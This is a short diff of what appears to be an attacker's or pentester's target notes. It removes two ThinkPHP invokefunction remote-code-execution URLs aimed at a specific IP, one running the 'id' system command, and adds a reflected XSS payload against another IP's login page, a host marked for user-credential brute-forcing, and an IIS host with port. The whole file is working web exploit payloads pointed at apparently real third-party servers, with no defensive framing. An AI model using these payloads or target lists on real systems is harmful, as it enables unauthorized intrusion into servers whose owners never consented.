@@ -1,2 +1,10 @@
-http://118.184.212.147//?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
-http://118.184.212.147/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+
+
+xss
+http://118.184.216.8/login/show?error=%E7%99%BB%22;%3C/Script%3E%3Cscript%3Ealert(1)%3C/Script%3E%22
+
+用户爆破
+http://118.184.216.8/
+
+iis
+http://218.93.215.38:8088
